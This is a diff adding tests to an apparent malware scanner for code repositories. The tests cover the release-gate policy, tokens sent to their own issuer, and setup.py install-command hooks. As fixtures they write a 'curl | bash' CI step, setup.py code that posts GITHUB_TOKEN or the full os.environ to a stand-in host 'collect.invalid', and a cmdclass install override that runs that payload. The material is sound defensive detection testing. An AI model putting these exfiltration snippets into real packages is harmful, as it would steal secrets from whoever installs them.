@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import random
 import string
+from types import SimpleNamespace
 from typing import ClassVar
 
 import pytest
@@ -12531,3 +12532,230 @@ class TestTheAnchorAndTheCollapseAreDifferentQuestions:
             )
         found = self._found(tmp_path, "SUSPECT.PERSIST.001")
         assert len(found) > 1, "different constructs in different files are different findings"
+
+
+class TestWhatShouldStopARelease:
+    """76.2% of 1,427 ordinary open-source repositories failed the default gate.
+
+    Triage said the findings were mostly RIGHT. `SUSPECT.CI.FETCH_EXEC.001` was
+    correct in every sample examined -- mise, rustup, transifex, sentry-cli,
+    wasm-pack, all genuinely `curl | sh` in a workflow. `SUSPECT.DROPPER.001`
+    was right about nine times in ten. `SECRET.GOOGLE.API_KEY.001` found real
+    `AIzaSy` keys committed to source. Deleting or weakening those rules would
+    be the wrong fix for the wrong reason.
+
+    They are simply not a reason to stop a release. `privileged: true`, a
+    security group open to the internet, a Dockerfile that installs a tool with
+    `curl | sh` -- each is a choice the project already made, about itself,
+    deliberately. None is evidence that the code is compromised or is leaking
+    anything, which is what a gate is for.
+
+    So they are reported in full and do not fail the build. The argument is the
+    one written into half the rules in this pack, applied to the gate instead of
+    to a pattern: a scanner that fails a build on the first day gets switched
+    off, and a switched-off scanner catches nothing at all.
+    """
+
+    def _verdict(self, root):
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.policy import PolicyGate
+
+        config = Config.default()
+        return PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
+
+    def _write(self, tmp_path) -> None:
+        infra = tmp_path / "infra"
+        infra.mkdir()
+        (infra / "main.tf").write_text(
+            'resource "aws_security_group" "x" {\n  ingress {\n'
+            '    from_port   = 22\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\n',
+            encoding="utf-8",
+        )
+        flows = tmp_path / ".github" / "workflows"
+        flows.mkdir(parents=True)
+        (flows / "ci.yml").write_text(
+            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: curl -fsSL https://example.invalid/i.sh | bash\n",
+            encoding="utf-8",
+        )
+
+    def test_posture_is_reported_and_does_not_fail_the_build(self, tmp_path) -> None:
+        self._write(tmp_path)
+        from cordon_scanner.core.config import Config
+
+        result = Scanner(Config.default()).scan(tmp_path)
+        rules = {f.rule_id for f in result.findings}
+        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" in rules, "still reported"
+        assert "SUSPECT.CI.FETCH_EXEC.001" in rules, "still reported"
+        assert not self._verdict(tmp_path).triggering, "and not a reason to stop a release"
+
+    def test_a_leaked_credential_still_fails(self, tmp_path) -> None:
+        self._write(tmp_path)
+        (tmp_path / "creds.py").write_text(
+            'API_KEY = "k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3"\n', encoding="utf-8"
+        )
+        triggering = self._verdict(tmp_path).triggering
+        assert [f.rule_id for f in triggering] == ["SECRET.GENERIC.ASSIGNMENT.001"]
+
+    def test_malware_in_an_advisory_domain_still_fails(self) -> None:
+        """`MALWARE.CI.SECRET_EXFIL.001` lives in `cicd`, and the carve-out must
+        not reach it: its category is the stronger claim about the same file.
+        The category test runs first for exactly this reason."""
+        from cordon_scanner.core.config import Policy
+        from cordon_scanner.core.models import Category, Confidence, Severity
+        from cordon_scanner.core.policy import PolicyGate
+        from cordon_scanner.core.taxonomy import ThreatDomain, domain_of
+
+        assert domain_of("MALWARE.CI.SECRET_EXFIL.001") is ThreatDomain.CICD
+        assert ThreatDomain.CICD in Policy.default().advisory_domains
+
+        finding = SimpleNamespace(
+            category=Category.MALICIOUS,
+            threat_domain=ThreatDomain.CICD,
+            confidence=Confidence.HIGH,
+            severity=Severity.CRITICAL,
+        )
+        assert PolicyGate._fails(finding, Policy.default())
+
+    def test_the_carve_out_can_be_turned_off(self, tmp_path) -> None:
+        """The pre-0.3 behaviour, in two lines, for anyone who wants it."""
+        self._write(tmp_path)
+        (tmp_path / "cordon.yaml").write_text("policy:\n  advisory_domains: []\n", encoding="utf-8")
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.policy import PolicyGate
+
+        config = Config.discover(tmp_path)
+        verdict = PolicyGate.evaluate(Scanner(config).scan(tmp_path), config.policy)
+        assert len(verdict.triggering) == 2
+
+
+class TestACredentialSentToItsOwnIssuer:
+    """`vllm`'s `setup.py` asks GitHub which commit `main` is on, and
+    authenticates so the request is not rate-limited:
+
+        github_token = os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))
+        curl_cmd += ["-H", f"Authorization: token {github_token}"]
+
+    A credential read, an outbound request, install-time context:
+    `MALWARE.EXFIL.001` at CRITICAL, in the MALICIOUS category, telling the
+    reader to treat their host as compromised. `pytorch`'s `torch/hub.py` does
+    the same thing for the same reason.
+
+    Nothing is exfiltrated. The host being contacted issued the token, already
+    knows it, and is the only party it is good against.
+    """
+
+    def _malware(self, root) -> list[str]:
+        return [
+            f.rule_id for f in Scanner().scan(root).findings if f.rule_id.startswith("MALWARE.")
+        ]
+
+    def _setup(self, tmp_path, host: str) -> None:
+        (tmp_path / "setup.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "from setuptools import setup\n"
+            "\n"
+            'token = os.environ.get("GITHUB_TOKEN")\n'
+            f'urlopen("https://{host}/repos/x/y", data=token.encode())\n'
+            'setup(name="x")\n',
+            encoding="utf-8",
+        )
+
+    def test_a_github_token_sent_to_github_is_authentication(self, tmp_path) -> None:
+        self._setup(tmp_path, "api.github.com")
+        assert "MALWARE.EXFIL.001" not in self._malware(tmp_path)
+
+    def test_the_same_token_sent_anywhere_else_is_not(self, tmp_path) -> None:
+        """The guard, and the whole reason the test above is safe to write.
+        Identical file, one hostname changed."""
+        self._setup(tmp_path, "collect.invalid")
+        assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
+
+    def test_a_second_host_alongside_the_issuer_is_not_excused(self, tmp_path) -> None:
+        """It takes effect only when EVERY host belongs to the issuer. A payload
+        that also talks to its own collector names another host."""
+        (tmp_path / "setup.py").write_text(
+            "import os\n"
+            "from urllib.request import urlopen\n"
+            "from setuptools import setup\n"
+            "\n"
+            'token = os.environ.get("GITHUB_TOKEN")\n'
+            'urlopen("https://api.github.com/repos/x/y")\n'
+            'urlopen("https://collect.invalid/p", data=token.encode())\n'
+            'setup(name="x")\n',
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
+
+
+class TestACommandNobodyRunsOnInstall:
+    """`sympy`'s `setup.py` imports no sympy at module level.
+
+    The three that exist sit inside `test_sympy` and `antlr`, wired as
+    `cmdclass={'test': test_sympy, 'antlr': antlr}` -- commands a person runs
+    deliberately and `pip install` never does. Following them put 233 files of
+    sympy into install-time context, and `sympy/external/importtools.py`, whose
+    `__import__(module + '.' + submod)` is how a library probes for an optional
+    dependency, became `MALWARE.DYNAMIC_DISPATCH.001` at CRITICAL.
+    """
+
+    PAYLOAD = (
+        "import os\n"
+        "from urllib.request import urlopen\n"
+        "\n"
+        "def go():\n"
+        '    urlopen("https://collect.invalid/p", data=str(dict(os.environ)).encode())\n'
+    )
+
+    def _malware(self, root) -> list[str]:
+        return [
+            f.rule_id for f in Scanner().scan(root).findings if f.rule_id.startswith("MALWARE.")
+        ]
+
+    def _tree(self, tmp_path, command: str) -> None:
+        (tmp_path / "_payload.py").write_text(self.PAYLOAD, encoding="utf-8")
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup, Command\n"
+            "\n"
+            "class Custom(Command):\n"
+            "    def run(self):\n"
+            "        from _payload import go\n"
+            "        go()\n"
+            "\n"
+            f'setup(name="x", cmdclass={{"{command}": Custom}})\n',
+            encoding="utf-8",
+        )
+
+    @pytest.mark.parametrize("command", ["test", "antlr", "docs", "lint"])
+    def test_a_command_an_install_never_runs_is_not_install_time(
+        self, tmp_path, command: str
+    ) -> None:
+        self._tree(tmp_path, command)
+        assert "MALWARE.EXFIL.001" not in self._malware(tmp_path)
+
+    @pytest.mark.parametrize("command", ["install", "build_py", "bdist_wheel", "develop"])
+    def test_a_command_an_install_does_run_still_is(self, tmp_path, command: str) -> None:
+        """The shape this closure exists for. 82 of the 252 real malicious PyPI
+        packages that survived the recall work override a consumer-install
+        command exactly like this."""
+        self._tree(tmp_path, command)
+        assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
+
+    def test_an_unwired_command_class_is_still_followed(self, tmp_path) -> None:
+        """Only classes actually registered in `cmdclass` are inert. Leaving an
+        unregistered one followed keeps this from becoming a way to hide an
+        import behind a class nobody wires in."""
+        (tmp_path / "_payload.py").write_text(self.PAYLOAD, encoding="utf-8")
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup, Command\n"
+            "\n"
+            "class Custom(Command):\n"
+            "    def run(self):\n"
+            "        from _payload import go\n"
+            "        go()\n"
+            "\n"
+            'setup(name="x")\n',
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in self._malware(tmp_path)
